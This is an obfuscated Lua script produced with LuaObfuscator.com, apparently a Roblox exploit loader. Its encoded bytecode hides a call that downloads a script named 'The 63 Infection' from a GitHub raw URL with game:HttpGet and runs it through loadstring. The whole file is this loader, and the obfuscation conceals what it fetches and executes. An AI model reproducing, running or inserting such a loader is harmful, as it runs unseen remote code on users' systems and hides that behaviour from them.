--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v80=0;while true do if (v80==0) then v19=v0(v3(v30,1,1));return "";end end else local v81=v2(v0(v30,16));if v19 then local v92=v5(v81,v19);v19=nil;return v92;else return v81;end end end);local function v20(v31,v32,v33) if v33 then local v82=(v31/((5 -3)^(v32-(2 -1))))%(((880 -(282 + 595)) -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v82-(v82%1) ;else local v83=568 -(367 + 201) ;local v84;while true do if (v83==(927 -(214 + 713))) then v84=((1638 -(1523 + 114)) + 1)^(v32-(1 + 0)) ;return (((v31%(v84 + v84))>=v84) and 1) or 0 ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (2 -0) ;return (v36 * (1321 -(68 + 997))) + v35 ;end local function v23() local v37=1270 -(226 + 1044) ;local v38;local v39;local v40;local v41;while true do if (v37==(4 -(11 -8))) then return (v41 * ((31012564 -(802 + 150)) -14234396)) + (v40 * (65653 -(32 + 85))) + (v39 * (251 + 5)) + v38 ;end if (v37==(0 + 0)) then v38,v39,v40,v41=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (9 -5) ;v37=958 -(892 + 65) ;end end end local function v24() local v42=v23();local v43=v23();local v44=2 -1 ;local v45=(v20(v43,1 -0 ,15 + 5 ) * (2^((1820 -791) -(915 + 82)))) + v42 ;local v46=v20(v43,21,87 -56 );local v47=((v20(v43,(461 -(416 + 26)) + 13 )==1) and  -(1 -0)) or ((1626 -(145 + 293)) -(1069 + 118)) ;if (v46==(0 -(430 -(44 + 386)))) then if (v45==0) then return v47 * (0 -0) ;else v46=1;v44=0;end elseif (v46==(356 + 1691)) then return ((v45==(0 -0)) and (v47 * (((3 -2) + 0)/((2277 -(998 + 488)) -(368 + 423))))) or (v47 * NaN) ;end return v8(v47,v46-(3214 -(697 + 1494)) ) * (v44 + (v45/((20 -(5 + 5 + 8))^(199 -147)))) ;end local function v25(v48) local v49=0;local v50;local v51;while true do if (v49==(1 + 0)) then v50=v3(v16,v18,(v18 + v48) -(860 -(814 + 45)) );v18=v18 + v48 ;v49=4 -2 ;end if (v49==(775 -(201 + 571))) then return v6(v51);end if (v49==(1138 -(7 + 109 + 362 + 660))) then v50=nil;if  not v48 then v48=v23();if (v48==0) then return "";end end v49=4 -(888 -(261 + 624)) ;end if (v49==(2 + 0)) then v51={};for v93=3 -2 , #v50 do v51[v93]=v2(v1(v3(v50,v93,v93)));end v49=10 -7 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return 0;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do if (v52==0) then local v88=(function() return 0;end)();local v89=(function() return;end)();while true do if (v88~=0) then else v89=(function() return 0 + 0 ;end)();while true do if (v89~=(0 + 0)) then else v53=(function() return function(v153,v154,v155) local v156=(function() return 0 -0 ;end)();local v157=(function() return;end)();while true do if (v156~=(0 -0)) then else v157=(function() return 0 -0 ;end)();while true do if (0~=v157) then else local v169=(function() return 0;end)();local v170=(function() return;end)();while true do if (v169==(0 + 0)) then v170=(function() return 0;end)();while true do if ((0 + 0)~=v170) then else v153[v154-#"}" ]=(function() return v155();end)();return v153,v154,v155;end end break;end end end end break;end end end;end)();v54=(function() return {};end)();v89=(function() return 1;end)();end if (v89==1) then v55=(function() return {};end)();v52=(function() return 397 -(115 + 281) ;end)();break;end end break;end end end if (v52~=1) then else local v90=(function() return 0;end)();while true do if ((0 -0)~=v90) then else v56=(function() return {};end)();v57=(function() return {v54,v55,nil,v56};end)();v90=(function() return 1;end)();end if (v90==(2 -1)) then v58=(function() return v23();end)();v52=(function() return 2;end)();break;end end end if (v52==(7 -5)) then local v91=(function() return 0;end)();while true do if (v91==1) then v57[ #"asd"]=(function() return v21();end)();v52=(function() return 870 -(550 + 317) ;end)();break;end if (v91~=(0 -0)) then else v59=(function() return {};end)();for v108= #"!",v58 do local v109=(function() return 0 -0 ;end)();local v110=(function() return;end)();local v111=(function() return;end)();while true do if (v109==(0 -0)) then local v151=(function() return 0;end)();while true do if (v151==(286 -(134 + 151))) then v109=(function() return 1666 -(970 + 695) ;end)();break;end if (v151==(0 -0)) then v110=(function() return v21();end)();v111=(function() return nil;end)();v151=(function() return 1;end)();end end end if (v109==(1991 -(582 + 1408))) then if (v110== #">") then v111=(function() return v21()~=0 ;end)();elseif (v110==(6 -4)) then v111=(function() return v24();end)();elseif (v110== #"-19") then v111=(function() return v25();end)();end v59[v108]=(function() return v111;end)();break;end end end v91=(function() return 1 -0 ;end)();end end end if (3~=v52) then else for v95= #"[",v23() do local v96=(function() return v21();end)();if (v20(v96, #",", #"[")==(0 -0)) then local v103=(function() return 1824 -(1195 + 629) ;end)();local v104=(function() return;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();while true do if (v103==0) then v104=(function() return 0 -0 ;end)();v105=(function() return nil;end)();v103=(function() return 242 -(187 + 54) ;end)();end if (v103~=(781 -(162 + 618))) then else local v146=(function() return 0 + 0 ;end)();while true do if (v146==(0 + 0)) then v106=(function() return nil;end)();v107=(function() return nil;end)();v146=(function() return 1;end)();end if (v146~=(1 -0)) then else v103=(function() return 2;end)();break;end end end if (v103==2) then while true do if (v104==(2 -0)) then local v158=(function() return 0 + 0 ;end)();while true do if (v158==(1636 -(1373 + 263))) then if (v20(v106, #"{", #"<")~= #">") then else v107[1002 -(451 + 549) ]=(function() return v59[v107[2]];end)();end if (v20(v106,2,2)~= #"}") then else v107[ #"19("]=(function() return v59[v107[ #"19("]];end)();end v158=(function() return 1 + 0 ;end)();end if (v158==(1 -0)) then v104=(function() return  #"-19";end)();break;end end end if (v104==0) then local v159=(function() return 0 -0 ;end)();local v160=(function() return;end)();while true do if (v159~=(1384 -(746 + 638))) then else v160=(function() return 0 + 0 ;end)();while true do if (v160==(1 -0)) then v104=(function() return  #"{";end)();break;end if (v160==0) then v105=(function() return v20(v96,2, #"xxx");end)();v106=(function() return v20(v96, #"xnxx",6);end)();v160=(function() return 342 -(218 + 123) ;end)();end end break;end end end if (v104== #"]") then local v161=(function() return 0;end)();local v162=(function() return;end)();while true do if (v161==(1581 -(1535 + 46))) then v162=(function() return 0 + 0 ;end)();while true do if (v162==(0 + 0)) then v107=(function() return {v22(),v22(),nil,nil};end)();if (v105==(560 -(306 + 254))) then local v173=(function() return 0 + 0 ;end)();local v174=(function() return;end)();while true do if (v173~=0) then else v174=(function() return 0 -0 ;end)();while true do if (v174~=0) then else v107[ #"19("]=(function() return v22();end)();v107[ #"?id="]=(function() return v22();end)();break;end end break;end end elseif (v105== #"!") then v107[ #"-19"]=(function() return v23();end)();elseif (v105==(1469 -(899 + 568))) then v107[ #"-19"]=(function() return v23() -((2 + 0)^(38 -22)) ;end)();elseif (v105== #"gha") then local v180=(function() return 603 -(268 + 335) ;end)();local v181=(function() return;end)();while true do if (v180==0) then v181=(function() return 0;end)();while true do if (0==v181) then v107[ #"xxx"]=(function() return v23() -((292 -(60 + 230))^(588 -(426 + 146))) ;end)();v107[ #"0313"]=(function() return v22();end)();break;end end break;end end end v162=(function() return 1 + 0 ;end)();end if (v162~=1) then else v104=(function() return 1458 -(282 + 1174) ;end)();break;end end break;end end end if (v104== #"xxx") then if (v20(v106, #"91(", #"-19")~= #"]") then else v107[ #"xnxx"]=(function() return v59[v107[ #"?id="]];end)();end v54[v95]=(function() return v107;end)();break;end end break;end end end end for v97= #"]",v23() do v55,v97,v28=(function() return v53(v55,v97,v28);end)();end return v57;end end end local function v29(v60,v61,v62) local v63=v60[812 -(569 + 242) ];local v64=v60[5 -3 ];local v65=v60[(4 -3) + 2 ];return function(...) local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=1025 -(706 + 318) ;local v71= -(1252 -(721 + 530));local v72={};local v73={...};local v74=v12("#",...) -((2025 -(239 + 514)) -(945 + 326)) ;local v75={};local v76={};for v85=(0 + 0) -0 ,v74 do if (v85>=v68) then v72[v85-v68 ]=v73[v85 + 1 + 0 ];else v76[v85]=v73[v85 + (701 -(271 + 429)) ];end end local v77=(v74-v68) + 1 + 0 ;local v78;local v79;while true do v78=v66[v70];v79=v78[983 -(18 + 964) ];if ((3242>=567) and (v79<=(1503 -(1408 + 92)))) then if (v79<=1) then if (v79==(1086 -(461 + 625))) then local v112=v78[1290 -(993 + 295) ];local v113,v114=v69(v76[v112](v13(v76,v112 + 1 + 0 + 0 ,v78[1 + 2 ])));v71=(v114 + v112) -(851 -(20 + (2159 -(797 + 532)))) ;local v115=1171 -(304 + 114 + 255 + 498) ;for v147=v112,v71 do local v148=0 + 0 ;while true do if ((126 -(116 + 10))==v148) then v115=v115 + 1 + 0 ;v76[v147]=v113[v115];break;end end end else do return;end end elseif ((v79>((1 -0) + 1)) or (847>=1263)) then v76[v78[1 + 1 ]]();else v76[v78[1 + 1 ]]=v62[v78[6 -3 ]];end elseif ((v79<=(534 -(406 + 123))) or (2253==1851)) then if (v79==(1773 -((2085 -(144 + 192)) + 20))) then local v118=v78[1 + 1 ];local v119=v76[v78[(2 -1) + 2 ]];v76[v118 + (1323 -(1249 + 73)) ]=v119;v76[v118]=v119[v78[2 + 2 ]];else v76[v78[1147 -(466 + 679) ]]=v78[2 + 1 ];end elseif ((v79>(14 -8)) or (2087>2372)) then local v125;local v126,v127;local v128;local v129;v76[v78[4 -2 ]]=v62[v78[7 -4 ]];v70=v70 + ((1204 -(373 + 829)) -1) ;v78=v66[v70];v76[v78[407 -(118 + (1018 -(476 + 255))) ]]=v62[v78[3]];v70=v70 + (3 -2) ;v78=v66[v70];v129=v78[1902 -(106 + 1794) ];v128=v76[v78[1 + 2 ]];v76[v129 + 1 + 0 ]=v128;v76[v129]=v128[v78[11 -7 ]];v70=v70 + (2 -1) ;v78=v66[v70];v76[v78[9 -7 ]]=v78[117 -(4 + 110) ];v70=v70 + (585 -(57 + 527)) ;v78=v66[v70];v129=v78[1429 -(41 + (1602 -(42 + 174))) ];v126,v127=v69(v76[v129](v13(v76,v129 + (104 -(17 + 86)) ,v78[(1133 -(369 + 761)) + 0 + 0 ])));v71=(v127 + v129) -((1 + 0) -0) ;v125=(0 -0) -0 ;for v149=v129,v71 do local v150=166 -(122 + 44) ;while true do if ((v150==((0 -0) -0)) or (4445<4149)) then v125=v125 + 1 ;v76[v149]=v126[v125];break;end end end v70=v70 + (3 -2) ;v78=v66[v70];v129=v78[2 + 0 ];v76[v129]=v76[v129](v13(v76,v129 + 1 + 0 ,v71));v70=v70 + 1 + 0 + 0 ;v78=v66[v70];v76[v78[(2 + 1) -1 ]]();v70=v70 + 1 ;v78=v66[v70];do return;end else local v144=v78[(1571 -(363 + 1141)) -((268 -(64 + 174)) + 35) ];v76[v144]=v76[v144](v13(v76,v144 + 1 + 0 ,v71));end v70=v70 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574035E3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861636B657253706163653Q33312F536372697074732F726566732F68656164732F6D61696E2F5468652532303633253230496E66656374696F6E00083Q0012073Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000100039Q0000026Q000100016Q00017Q00",v9(),...);